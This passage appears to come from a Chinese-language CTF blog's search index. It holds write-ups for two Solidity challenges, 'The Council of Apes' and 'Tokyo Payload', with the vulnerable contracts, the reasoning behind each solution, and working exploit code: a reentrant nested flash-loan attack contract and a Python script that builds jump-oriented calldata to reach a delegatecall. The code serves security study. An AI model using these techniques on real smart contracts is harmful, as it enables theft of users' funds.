} //---------------------------- Public Functions ----------------------------// function createPool ( address token ) onlyApe () payable external { require ( msg . value == 1 ether , \"You must pay 1 Ether to create a pool\" ); //Check if pool already exists require ( address ( pools [ token ]) == address ( 0 ), \"This pool already exists\" ); //Create the pool and add it to the pools mapping pools [ token ] = new IcyPool ( address ( icyToken ), token ); //Every pool needs to be initialized with 100,000 of the chosen tokens and will get 100,000 of the icyToken IERC20 ( token ). transferFrom ( msg . sender , address ( pools [ token ]), 100 _000 ); icyToken . transfer ( address ( pools [ token ]), 100 _000 ); } function swap ( address fromToken , address toToken , uint256 amount ) onlyApe () external { require ( amount > 0 , \"You must swap at least 1 token\" ); IcyPool pool ; if ( fromToken == address ( icyToken )) { pool = pools [ toToken ]; } else if ( toToken == address ( icyToken )) { pool = pools [ fromToken ]; } pool . swap ( msg . sender , fromToken , toToken , amount ); } //---------------------------- Lending Functions ----------------------------// //We offer the worlds first collateralized flash loan (even safer than anything else) function collateralizedFlashloan ( address collateralToken , uint256 amount , address target ) onlyApe () external { require ( amount > 0 , \"You must lend out at least 1 token\" ); require ( amount <= icyToken . balanceOf ( address ( this )), \"We can't lend you this much\" ); require ( IERC20 ( collateralToken ). totalSupply () <= 100 _000_000 , \"Shitcoins are not accepted\" ); require ( address ( pools [ collateralToken ]) != address ( 0 ), \"This pool does not exist\" ); uint256 neededCollateral = pools [ collateralToken ]. getTokensPerIcyToken ( amount ); require ( neededCollateral <= 100 _000_000 , \"Shitcoins are still not accepted, don't try to cheat us\" ); //Receive the collateral IERC20 ( collateralToken ). transferFrom ( msg . sender , address ( this ), neededCollateral ); //Flashloan happens icyToken . transfer ( msg . sender , amount ); //You get to do stuff ( bool success , ) = target . call ( abi . encodeWithSignature ( \"receiveFlashLoan(uint256)\" , amount )); require ( success ); //By here we should get all our money back icyToken . transferFrom ( msg . sender , address ( this ), amount ); //Return the collateral IERC20 ( collateralToken ). transfer ( msg . sender , neededCollateral ); } //---------------------------- View Functions ----------------------------// function getPoolCount () public view returns ( uint256 ) { return poolCounter ; } function getPool ( address token ) public view returns ( IcyPool ) { return pools [ token ]; } } CouncilOfApes.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 pragma solidity ^ 0.8.20 ; import \"./IcyPool.sol\" ; contract CouncilOfApes { mapping ( address => uint256 ) public bananaBalance ; mapping ( address => uint256 ) public votes ; mapping ( address => apeClass ) public members ; bool public dissolved ; IERC20 public icyToken ; uint256 lastVote ; enum apeClass { NOBODY , APE , CHIMP , ORANGUTAN , GORILLA } modifier notDissolved { require ( dissolved == false , \"The council has been dissolved\" ); _ ; } modifier onlyAlpha { require ( members [ msg . sender ] == apeClass . GORILLA , \"This function can only be called by an alpha ape\" ); _ ; } constructor ( address _icyToken ) { dissolved = false ; icyToken = IERC20 ( _icyToken ); lastVote = 0 ; } //--------------------------- APE FUNCTIONS ---------------------------// //To become an ape you have to say the holy words. function becomeAnApe ( bytes32 theHolyWords ) external notDissolved { require ( theHolyWords == keccak256 ( \"I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing\" )); //You are officially an ape now members [ msg . sender ] = apeClass . APE ; //You get a free banana bananaBalance [ msg . sender ] = 1 ; } //You can also buy bananas from the apes function buyBanana ( uint256 amount ) external notDissolved () { require ( members [ msg . sender ] == apeClass . APE ); icyToken . transferFrom ( msg . sender , address ( this ), amount ); bananaBalance [ msg . sender ] += amount ; } //You can also get your bananas back function sellBanana ( uint256 amount ) external notDissolved () { require ( bananaBalance [ msg . sender ] >= amount , \"You don't have that many bananas\" ); icyToken . transfer ( msg . sender , amount ); bananaBalance [ msg . sender ] -= amount ; } //Every cycle the apes vote for new alphas with their bananas function vote ( address target , uint256 amount ) external { require ( bananaBalance [ msg . sender ] >= amount , \"You don't have that many bananas\" ); bananaBalance [ msg . sender ] -= amount ; votes [ target ] += amount ; } //If you have enough votes, you can claim a new rank function claimNewRank () external { if ( votes [ msg . sender ] >= 1 _000_000_000 ) { members [ msg . sender ] = apeClass . GORILLA ; lastVote = block . timestamp ; } else if ( votes [ msg . sender ] >= 1 _000_000 ) { members [ msg . sender ] = apeClass . ORANGUTAN ; lastVote = block . timestamp ; } else if ( votes [ msg . sender ] >= 1 _000 ) { members [ msg . sender ] = apeClass . CHIMP ; lastVote = block . timestamp ; } } //--------------------------- ALPHA FUNCTIONS ---------------------------// //The alpha can issue himself bananas function issueBanana ( uint256 amount , address target ) external notDissolved () onlyAlpha () { require ( amount > 0 , \"You must issue at least 1 banana\" ); bananaBalance [ target ] += amount ; } //If you are one of the alpha apes, you can dissolve the council function dissolveCouncilOfTheApes ( bytes32 theEvilWords ) external notDissolved () onlyAlpha () { require ( theEvilWords == keccak256 ( \"Kevin come out of the basement, dinner is ready.\" )); dissolved = true ; } //--------------------------- VIEW FUNCTIONS ---------------------------// function getBananaBalance ( address target ) external view returns ( uint256 ) { return bananaBalance [ target ]; } function getVotes ( address target ) external view returns ( uint256 ) { return votes [ target ]; } function getMemberClass ( address target ) external view returns ( apeClass ) { return members [ target ]; } function isDissolved () external view returns ( bool ) { return dissolved ; } } IcyPool.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 pragma solidity ^ 0.8.20 ; import \"./TotallyNotCopiedToken.sol\" ; contract IcyPool { address public exchange ; IERC20 public icyToken ; IERC20 public token2 ; modifier onlyExchange { require ( msg . sender == exchange , \"Only the exchange can call this function\" ); _ ; } constructor ( address icyToken_ , address token2_ ) { icyToken = IERC20 ( icyToken_ ); token2 = IERC20 ( token2_ ); exchange = msg . sender ; } //----------------------------- External Functionalities -----------------------------------------// function swap ( address caller , address fromToken , address toToken , uint256 amount ) onlyExchange external { uint256 receivedTokens = _calculateOutput ( fromToken , toToken , amount ); //Check if the pool has enough tokens to swap require ( IERC20 ( toToken ). balanceOf ( address ( this )) > receivedTokens , \"The pool does not have enough tokens to swap\" ); //Let the pool swap the tokens IERC20 ( fromToken ). transferFrom ( caller , address ( this ), amount ); //Transfer the tokens back to the caller IERC20 ( toToken ). transfer ( caller , receivedTokens ); } function getTokensPerIcyToken ( uint256 amount ) view external returns ( uint256 ) { return _calculateOutput ( address ( icyToken ), address ( token2 ), amount ); } //----------------------------- Internal Functionalities -----------------------------------------// function _calculateOutput ( address _tokenFrom , address _tokenTo , uint256 amount ) internal view returns ( uint256 ) { uint256 balanceOfTokenFrom = IERC20 ( _tokenFrom ). balanceOf ( address ( this )); uint256 balanceOfTokenTo = IERC20 ( _tokenTo ). balanceOf ( address ( this )); uint256 returned_tokens = ( amount * balanceOfTokenTo ) / balanceOfTokenFrom ; if ( returned_tokens >= balanceOfTokenTo ) { returned_tokens = balanceOfTokenTo - 1 ; } return returned_tokens ; } } TotallyNotCopiedToken.sol 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.20 ; import \"./libraries/ERC20.sol\" ; contract TotallyNotCopiedToken is ERC20 { constructor ( address owner , string memory name , string memory symbol ) ERC20 ( name , symbol ) { _mint ( owner , type ( uint256 ). max ); } }","title":"\u9898\u76ee"},{"location":"blockchain/the_council_of_apes/#_2","text":"\u76ee\u6807\u662f\u89e3\u6563 CouncilOfApes 1 2 3 function isSolved () public view returns ( bool ) { return TARGET . council (). isDissolved (); } \u53ea\u6709 apeClass \u4e3a GORILLA \u624d\u80fd\u89e3\u6563\u59d4\u5458\u4f1a 1 2 3 4 5 6 7 8 modifier onlyAlpha { require ( members [ msg . sender ] == apeClass . GORILLA , \"This function can only be called by an alpha ape\" ); _ ; } //If you are one of the alpha apes, you can dissolve the council function dissolveCouncilOfTheApes ( bytes32 theEvilWords ) external notDissolved () onlyAlpha () \u6210\u4e3a GORILLA \u9700\u8981 \\(10^9\\) \u7968\uff0c\u5bf9\u5e94 \\(10^9\\) \u6839\u9999\u8549\uff0c\u9999\u8549\u53ef\u901a\u8fc7 icyToken \u5151\u6362\u3002\u6210\u4e3a GORILLA \u4e4b\u540e\u80fd\u591f\u83b7\u53d6\u4efb\u610f\u6570\u91cf\u7684\u9999\u8549\uff0c\u800c IcyExchange \u63d0\u4f9b icyToken \u95ea\u7535\u8d37\uff0c\u90a3\u4e48\u53ef\u4ee5\u501f\u52a9\u95ea\u7535\u8d37\u6210\u4e3a GORILLA \uff0c\u518d\u5356\u6389\u9999\u8549\u6362\u53d6 icyToken \u5f52\u8fd8\u95ea\u7535\u8d37 \u53d1\u8d77\u95ea\u7535\u8d37\u9700\u8981\u8d28\u62bc\u53e6\u4e00\u79cd\u4ee3\u5e01\u3002\u7531\u4e8e\u4ee3\u5e01\u603b\u53d1\u884c\u91cf\u4e0d\u80fd\u8d85\u8fc7 \\(10^8\\) \uff0c\u56e0\u800c\u4e0d\u80fd\u4f7f\u7528 TotallyNotCopiedToken \u3002\u4f46\u5355\u6b21\u95ea\u7535\u8d37\u7684\u91d1\u989d\u4e0d\u8db3\u4ee5\u6210\u4e3a GORILLA \uff0c\u8003\u8651\u5230\u6ca1\u6709\u91cd\u5165\u4fdd\u62a4\uff0c\u53ef\u4ee5\u5728 receiveFlashLoan() \u65f6\u518d\u6b21\u53d1\u8d77\u95ea\u7535\u8d37 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function collateralizedFlashloan ( address collateralToken , uint256 amount , address target ) onlyApe () external { require ( amount > 0 , \"You must lend out at least 1 token\" ); require ( amount <= icyToken . balanceOf ( address ( this )), \"We can't lend you this much\" ); require ( IERC20 ( collateralToken ). totalSupply () <= 100 _000_000 , \"Shitcoins are not accepted\" ); require ( address ( pools [ collateralToken ]) != address ( 0 ), \"This pool does not exist\" ); uint256 neededCollateral = pools [ collateralToken ]. getTokensPerIcyToken ( amount ); require ( neededCollateral <= 100 _000_000 , \"Shitcoins are still not accepted, don't try to cheat us\" ); //Receive the collateral IERC20 ( collateralToken ). transferFrom ( msg . sender , address ( this ), neededCollateral ); //Flashloan happens icyToken . transfer ( msg . sender , amount ); //You get to do stuff ( bool success , ) = target . call ( abi . encodeWithSignature ( \"receiveFlashLoan(uint256)\" , amount )); require ( success ); //By here we should get all our money back icyToken . transferFrom ( msg . sender , address ( this ), amount ); //Return the collateral IERC20 ( collateralToken ). transfer ( msg . sender , neededCollateral ); }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/the_council_of_apes/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 contract HackToken is ERC20 { constructor ( address owner ) ERC20 ( \"HackToken\" , \"HACK\" ) { _mint ( owner , 100 _000_000 ); } } contract CouncilOfApesHack { IcyExchange exchange ; CouncilOfApes council ; TotallyNotCopiedToken icyToken ; bytes32 theHolyWords = keccak256 ( \"I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing\" ); bytes32 theEvilWords = keccak256 ( \"Kevin come out of the basement, dinner is ready.\" ); function exploit ( Setup setup ) external payable { exchange = setup . TARGET (); council = exchange . council (); icyToken = exchange . icyToken (); icyToken . approve ( address ( exchange ), type ( uint256 ). max ); icyToken . approve ( address ( council ), type ( uint256 ). max ); council . becomeAnApe ( theHolyWords ); setup . claimFreeTokens (); HackToken token = new HackToken ( address ( this )); token . approve ( address ( exchange ), type ( uint256 ). max ); exchange . createPool { value : 1 ether }( address ( token )); exchange . collateralizedFlashloan ( address ( token ), token . balanceOf ( address ( this )), address ( this ) ); council . dissolveCouncilOfTheApes ( theEvilWords ); } function receiveFlashLoan ( uint256 amount ) external { require ( msg . sender == address ( exchange )); if ( icyToken . balanceOf ( address ( this )) < 1e9 ) { HackToken token = new HackToken ( address ( this )); token . approve ( address ( exchange ), type ( uint256 ). max ); exchange . createPool { value : 1 ether }( address ( token )); exchange . collateralizedFlashloan ( address ( token ), token . balanceOf ( address ( this )), address ( this ) ); } else { council . buyBanana ( 1e9 ); council . vote ( address ( this ), 1e9 ); council . claimNewRank (); } council . issueBanana ( amount , address ( this )); uint balance = icyToken . balanceOf ( address ( council )); council . sellBanana ( amount > balance ? balance : amount ); } }","title":"Exploit"},{"location":"blockchain/the_council_of_apes/#flag","text":"gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}","title":"Flag"},{"location":"blockchain/tokyo_payload/","tags":["smart contract","evm","bytecode","jump oriented programming"],"text":"#smart contract #evm #bytecode #jump oriented programming .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 What is Solidity? nc tokyo-payload.seccon.games 31337 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.21 ; import { TokyoPayload } from \"./TokyoPayload.sol\" ; contract Setup { TokyoPayload public tokyoPayload ; constructor () { tokyoPayload = new TokyoPayload (); } function isSolved () public view returns ( bool ) { return tokyoPayload . solved (); } } TokyoPayload.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.21 ; contract TokyoPayload { bool public solved ; uint256 public gasLimit ; function tokyoPayload ( uint256 x , uint256 y ) public { require ( x >= 0x40 ); resetGasLimit (); assembly { calldatacopy ( x , 0 , calldatasize ()) } function ()[] memory funcs ; uint256 z = y ; funcs [ z ](); } function load ( uint256 i ) public pure returns ( uint256 a , uint256 b , uint256 c ) { assembly { a := calldataload ( i ) b := calldataload ( add ( i , 0x20 )) c := calldataload ( add ( i , 0x40 )) } } function createArray ( uint256 length ) public pure returns ( uint256 [] memory ) { return new uint256 []( length ); } function resetGasLimit () public { uint256 [] memory arr ; gasLimit = arr . length ; } function delegatecall ( address addr ) public { require ( msg . sender == address ( 0xCAFE )); ( bool success ,) = addr . delegatecall { gas : gasLimit & 0xFFFF }( \"\" ); require ( success ); } } \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u8ba9 solved \u4e3a true \uff0c\u800c TokyoPayload \u6ca1\u6709\u76f4\u63a5\u8bbe\u7f6e solved \u7684\u8bed\u53e5\uff0c\u663e\u7136\u9700\u8981\u501f\u52a9 delegatecall \u5730\u5740\u68c0\u67e5\u9650\u5236\u4e86 TokyoPayload.delegatecall() \u7684\u8c03\u7528\uff0c\u5219\u53ea\u80fd\u901a\u8fc7 tokyoPayload() \u8df3\u8f6c \u5206\u914d\u7ed9 delegatecall \u7684 gas \u53d6\u51b3\u4e8e\u901a\u8fc7 arr.length \u8bbe\u7f6e\u7684 gasLimit \uff0c\u800c arr \u662f\u5c1a\u672a\u521d\u59cb\u5316\u7684\u5185\u5b58\u6570\u7ec4\uff0c\u90a3\u4e48\u5373\u8bfb\u53d6 MEM[0x60] \u4e2d\u7684\u503c\u3002 calldatacopy \u53ef\u4ee5\u8986\u76d6 MEM[0x60] \u4e2d\u7684\u503c\uff0c\u4f7f\u5f97 arr.length > 0 \uff0c\u7531\u6b64\u53ef\u786e\u5b9a \\(x\\in[40_{16}, 80_{16})\\) \uff08\u4e14\u7531\u4e8e\u6bcf\u6b21\u8c03\u7528 tokyoPayload() \u90fd\u4f1a\u91cd\u8bbe gasLimit \uff0c\u9700\u8981\u901a\u8fc7\u4e00\u6b21\u8c03\u7528\u6765\u5b8c\u6210\u591a\u6b21\u8df3\u8f6c\uff09 DELEGATECALL \u6240\u5728\u5757 JUMPDEST \u7684\u5730\u5740\u4e3a 0x1a3 \uff0c\u4ece\u6808\u9876\u5230\u6808\u5e95\u8c03\u7528\u6808\u5e94\u6ee1\u8db3 [\u76ee\u6807\u5730\u5740addr, \u4e0b\u4e00\u8df3\u8f6c\u5730\u5740, ...] \u5e0c\u671b\u4ee3\u7406\u8c03\u7528\u7ed3\u675f\u540e\u76f4\u63a5\u7ed3\u675f\u672c\u6b21\u4ea4\u6613\uff0c\u4e0b\u4e00\u8df3\u8f6c\u5730\u5740\u53ef\u4ee5\u9009\u62e9 0x93 \u53ef\u901a\u8fc7 calldataload \u5c06\u6240\u9700\u53c2\u6570\u538b\u5165\u6808\u4e2d\uff0c\u6784\u9020\u5408\u9002\u7684\u8c03\u7528\u6808\u3002\u4e09\u4e2a CALLDATALOAD \u6240\u5728\u5757 JUMPDEST \u7684\u5730\u5740\u4e3a 0xd0 \uff0c\u4ece\u6808\u9876\u5230\u6808\u5e95\u8c03\u7528\u6808\u5e94\u6ee1\u8db3 [\u8d77\u59cb\u5730\u5740i, \u4e0b\u4e00\u8df3\u8f6c\u5730\u5740, ...] \u3002\u6267\u884c\u5230 0xdf \u65f6\uff0c\u6808\u4e2d\u5143\u7d20\u4e3a [\u4e0b\u4e00\u8df3\u8f6c\u5730\u5740, c, b, a, ...] \u8c03\u7528 tokyoPayload() \u9996\u6b21\u6267\u884c\u5230\u51fd\u6570\u8df3\u8f6c\u524d\uff0c\u5373 0x18e JUMP \uff0c\u5bf9\u5e94\u6e90\u7801 funcs[z]() \uff0c\u5143\u7d20\u4ece\u6808\u9876\u5230\u6808\u5e95\u4f9d\u6b21\u4e3a [0x18f, y, 0x60, y, x, ...] \u5728\u5185\u5b58\u8986\u76d6\u5b8c\u6210\u540e\uff0c\u9700\u8981\u518d\u6b21\u8c03\u7528 resetGasLimit() \uff0c\u53ef\u4ee5\u9009\u62e9 0x153 JUMPDEST \uff0c\u6b64\u65f6 y \u5bf9\u5e94\u6808\u9876\u5143\u7d20 STACK[0] \uff0c x \u5bf9\u5e94 STACK[1] \u7531\u4e8e\u9700\u8981\u4f7f\u7528 SSTORE \u4e14\u5bf9\u5e94 cold slot\uff0c\u81f3\u5c11\u9700\u8981 22100 gas\uff0c tokyoPayload() \u7684\u51fd\u6570\u7b7e\u540d\u4e3a 0x40c3 (16579)\uff0c\u53ef\u4ee5\u8bbe x \u4e3a 0x7B (0x80 - 5)\uff0c\u8fd9\u6837 delegatecall \u7684 gasLimit \u4e3a 0xc300 \u53e6\u5916\uff0c 0x17f \u5bf9\u5e94\u7684\u5757\u53ef\u4ee5\u5bf9\u6808\u7ed3\u6784\u8fdb\u884c\u5fae\u8c03\uff0c\u53ef\u7528\u4e8e\u8df3\u8f6c 0xd0 \u524d\uff0c\u6539\u53d8\u6808\u9876\u53c2\u6570 i Exploit \u00b6 \u8c03\u7528 tokyoPayload() \uff0c\u8986\u76d6\u5185\u5b58\uff0c funcs[z]() \u4e3a 0x17f 0x17f MEM[0x20 * 0x18f + 0x20 + y] = 0xd0 \uff0c\u6267\u884c\u5230 0x18e JUMP \u65f6\uff0c\u6808\u4e2d\u5143\u7d20\u4ece\u6808\u9876\u5230\u6808\u5e95\u4f9d\u6b21\u4e3a [0xd0, 0x60, y, ...] \uff0c\u7531\u6b64 y \u4e3a 0x153 0xd0 \u6784\u9020\u6808\uff0c b \u5bf9\u5e94\u65b0\u7684 x \uff0c c \u5bf9\u5e94\u65b0\u7684 y 0x153 \u91cd\u8bbe gasLimit \uff0c\u4e0b\u4e00\u8df3\u8f6c\u5730\u5740 0x1a3 \u5bf9\u5e94 y \uff0c funcs[z]() \u4e3a 0xd0 0xd0 \u6784\u9020\u8c03\u7528\u6808 0x1a3 \u4ee3\u7406\u8c03\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 contract Logic { fallback () external payable { assembly { sstore ( 0 , 1 ) } } } contract TokyoPayloadTest is Test { TokyoPayload public tokyoPayload ; address logic ; function setUp () public { tokyoPayload = new TokyoPayload (); logic = address ( new Logic ()); } function testSolve () public { string [] memory inputs = new string []( 3 ); inputs [ 0 ] = \"python3\" ; inputs [ 1 ] = \"script/generate.py\" ; inputs [ 2 ] = Strings . toHexString ( logic ); bytes memory data = vm . ffi ( inputs ); ( bool s , ) = address ( tokyoPayload ). call ( data ); require ( s ); require ( tokyoPayload . solved ()); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import sys def place ( offset , value : int ): global data if l := len ( data ) // 2 < offset : data += '00' * ( offset - l + 0x20 ) data = data [: offset * 2 ] + f ' { value : 064x } ' + data [( offset + 0x20 ) * 2 :] target_addr = int ( sys . argv [ 1 ], 16 ) data = '000040c3' # sig data += f ' { 0x7b : 064x } ' # x data += f ' { 0x153 : 064x } ' # y place ( 0x4 + 0x153 * 0x20 + 1 , 0x17f ) # funcs[0x153] = 0x17f place ( 0x20 * 0x18f + 0x20 + 0x153 - 0x7b , 0xd0 ) # MEM[0x20 * 0x18f + 0x20 + y] = 0xd0 place ( 0x60 + 0x20 , 0x7c ) # b: new_x place ( 0x60 + 0x40 , 0x1a3 ) # c: new_y place ( 0x4 + 0x1a3 * 0x20 , 0xd0 ) # funcs[0x1a3] = 0xd0 place ( 0x18f + 0x20 , 0x93 ) # b: STOP JUMPDEST place ( 0x18f + 0x40 , target_addr ) # c: DELEGATECALL target print ( data ) \u53c2\u8003\u8d44\u6599 \u00b6 Layout in Memory \u2014 Solidity documentation Debugger - Foundry Book","title":"Tokyo Payload"},{"location":"blockchain/tokyo_payload/#_1","text":"What is Solidity? nc tokyo-payload.seccon.games 31337 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.21 ; import { TokyoPayload } from \"./TokyoPayload.sol\" ; contract Setup { TokyoPayload public tokyoPayload ; constructor () { tokyoPayload = new TokyoPayload (); } function isSolved () public view returns ( bool ) { return tokyoPayload . solved (); } } TokyoPayload.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.21 ; contract TokyoPayload { bool public solved ; uint256 public gasLimit ; function tokyoPayload ( uint256 x , uint256 y ) public { require ( x >= 0x40 ); resetGasLimit (); assembly { calldatacopy ( x , 0 , calldatasize ()) } function ()[] memory funcs ; uint256 z = y ; funcs [ z ](); } function load ( uint256 i ) public pure returns ( uint256 a , uint256 b , uint256 c ) { assembly { a := calldataload ( i ) b := calldataload ( add ( i , 0x20 )) c := calldataload ( add ( i , 0x40 )) } } function createArray ( uint256 length ) public pure returns ( uint256 [] memory ) { return new uint256 []( length ); } function resetGasLimit () public { uint256 [] memory arr ; gasLimit = arr . length ; } function delegatecall ( address addr ) public { require ( msg . sender == address ( 0xCAFE )); ( bool success ,) = addr . delegatecall { gas : gasLimit & 0xFFFF }( \"\" ); require ( success ); } }","title":"\u9898\u76ee"},{"location":"blockchain/tokyo_payload/#_2","text":"\u76ee\u6807\u662f\u8ba9 solved \u4e3a true \uff0c\u800c TokyoPayload \u6ca1\u6709\u76f4\u63a5\u8bbe\u7f6e solved \u7684\u8bed\u53e5\uff0c\u663e\u7136\u9700\u8981\u501f\u52a9 delegatecall \u5730\u5740\u68c0\u67e5\u9650\u5236\u4e86 TokyoPayload.delegatecall() \u7684\u8c03\u7528\uff0c\u5219\u53ea\u80fd\u901a\u8fc7 tokyoPayload() \u8df3\u8f6c \u5206\u914d\u7ed9 delegatecall \u7684 gas \u53d6\u51b3\u4e8e\u901a\u8fc7 arr.length \u8bbe\u7f6e\u7684 gasLimit \uff0c\u800c arr \u662f\u5c1a\u672a\u521d\u59cb\u5316\u7684\u5185\u5b58\u6570\u7ec4\uff0c\u90a3\u4e48\u5373\u8bfb\u53d6 MEM[0x60] \u4e2d\u7684\u503c\u3002 calldatacopy \u53ef\u4ee5\u8986\u76d6 MEM[0x60] \u4e2d\u7684\u503c\uff0c\u4f7f\u5f97 arr.length > 0 \uff0c\u7531\u6b64\u53ef\u786e\u5b9a \\(x\\in[40_{16}, 80_{16})\\) \uff08\u4e14\u7531\u4e8e\u6bcf\u6b21\u8c03\u7528 tokyoPayload() \u90fd\u4f1a\u91cd\u8bbe gasLimit \uff0c\u9700\u8981\u901a\u8fc7\u4e00\u6b21\u8c03\u7528\u6765\u5b8c\u6210\u591a\u6b21\u8df3\u8f6c\uff09 DELEGATECALL \u6240\u5728\u5757 JUMPDEST \u7684\u5730\u5740\u4e3a 0x1a3 \uff0c\u4ece\u6808\u9876\u5230\u6808\u5e95\u8c03\u7528\u6808\u5e94\u6ee1\u8db3 [\u76ee\u6807\u5730\u5740addr, \u4e0b\u4e00\u8df3\u8f6c\u5730\u5740, ...] \u5e0c\u671b\u4ee3\u7406\u8c03\u7528\u7ed3\u675f\u540e\u76f4\u63a5\u7ed3\u675f\u672c\u6b21\u4ea4\u6613\uff0c\u4e0b\u4e00\u8df3\u8f6c\u5730\u5740\u53ef\u4ee5\u9009\u62e9 0x93 \u53ef\u901a\u8fc7 calldataload \u5c06\u6240\u9700\u53c2\u6570\u538b\u5165\u6808\u4e2d\uff0c\u6784\u9020\u5408\u9002\u7684\u8c03\u7528\u6808\u3002\u4e09\u4e2a CALLDATALOAD \u6240\u5728\u5757 JUMPDEST \u7684\u5730\u5740\u4e3a 0xd0 \uff0c\u4ece\u6808\u9876\u5230\u6808\u5e95\u8c03\u7528\u6808\u5e94\u6ee1\u8db3 [\u8d77\u59cb\u5730\u5740i, \u4e0b\u4e00\u8df3\u8f6c\u5730\u5740, ...] \u3002\u6267\u884c\u5230 0xdf \u65f6\uff0c\u6808\u4e2d\u5143\u7d20\u4e3a [\u4e0b\u4e00\u8df3\u8f6c\u5730\u5740, c, b, a, ...] \u8c03\u7528 tokyoPayload() \u9996\u6b21\u6267\u884c\u5230\u51fd\u6570\u8df3\u8f6c\u524d\uff0c\u5373 0x18e JUMP \uff0c\u5bf9\u5e94\u6e90\u7801 funcs[z]() \uff0c\u5143\u7d20\u4ece\u6808\u9876\u5230\u6808\u5e95\u4f9d\u6b21\u4e3a [0x18f, y, 0x60, y, x, ...] \u5728\u5185\u5b58\u8986\u76d6\u5b8c\u6210\u540e\uff0c\u9700\u8981\u518d\u6b21\u8c03\u7528 resetGasLimit() \uff0c\u53ef\u4ee5\u9009\u62e9 0x153 JUMPDEST \uff0c\u6b64\u65f6 y \u5bf9\u5e94\u6808\u9876\u5143\u7d20 STACK[0] \uff0c x \u5bf9\u5e94 STACK[1] \u7531\u4e8e\u9700\u8981\u4f7f\u7528 SSTORE \u4e14\u5bf9\u5e94 cold slot\uff0c\u81f3\u5c11\u9700\u8981 22100 gas\uff0c tokyoPayload() \u7684\u51fd\u6570\u7b7e\u540d\u4e3a 0x40c3 (16579)\uff0c\u53ef\u4ee5\u8bbe x \u4e3a 0x7B (0x80 - 5)\uff0c\u8fd9\u6837 delegatecall \u7684 gasLimit \u4e3a 0xc300 \u53e6\u5916\uff0c 0x17f \u5bf9\u5e94\u7684\u5757\u53ef\u4ee5\u5bf9\u6808\u7ed3\u6784\u8fdb\u884c\u5fae\u8c03\uff0c\u53ef\u7528\u4e8e\u8df3\u8f6c 0xd0 \u524d\uff0c\u6539\u53d8\u6808\u9876\u53c2\u6570 i","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/tokyo_payload/#exploit","text":"\u8c03\u7528 tokyoPayload() \uff0c\u8986\u76d6\u5185\u5b58\uff0c funcs[z]() \u4e3a 0x17f 0x17f MEM[0x20 * 0x18f + 0x20 + y] = 0xd0 \uff0c\u6267\u884c\u5230 0x18e JUMP \u65f6\uff0c\u6808\u4e2d\u5143\u7d20\u4ece\u6808\u9876\u5230\u6808\u5e95\u4f9d\u6b21\u4e3a [0xd0, 0x60, y, ...] \uff0c\u7531\u6b64 y \u4e3a 0x153 0xd0 \u6784\u9020\u6808\uff0c b \u5bf9\u5e94\u65b0\u7684 x \uff0c c \u5bf9\u5e94\u65b0\u7684 y 0x153 \u91cd\u8bbe gasLimit \uff0c\u4e0b\u4e00\u8df3\u8f6c\u5730\u5740 0x1a3 \u5bf9\u5e94 y \uff0c funcs[z]() \u4e3a 0xd0 0xd0 \u6784\u9020\u8c03\u7528\u6808 0x1a3 \u4ee3\u7406\u8c03\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 contract Logic { fallback () external payable { assembly { sstore ( 0 , 1 ) } } } contract TokyoPayloadTest is Test { TokyoPayload public tokyoPayload ; address logic ; function setUp () public { tokyoPayload = new TokyoPayload (); logic = address ( new Logic ()); } function testSolve () public { string [] memory inputs = new string []( 3 ); inputs [ 0 ] = \"python3\" ; inputs [ 1 ] = \"script/generate.py\" ; inputs [ 2 ] = Strings . toHexString ( logic ); bytes 